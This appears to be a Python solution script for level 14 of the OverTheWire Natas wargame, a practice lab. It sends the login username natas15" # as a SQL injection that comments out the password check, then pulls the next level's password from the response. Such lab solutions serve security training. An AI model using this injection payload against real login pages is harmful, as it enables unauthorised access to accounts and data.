import requests
import re
from requests.auth import HTTPBasicAuth
def solve14(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    session.headers["Content-Type"] = "application/x-www-form-urlencoded"
    resp = session.post("http://natas14.natas.labs.overthewire.org/index.php", data={"username": "natas15\" #", "password": ''})
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw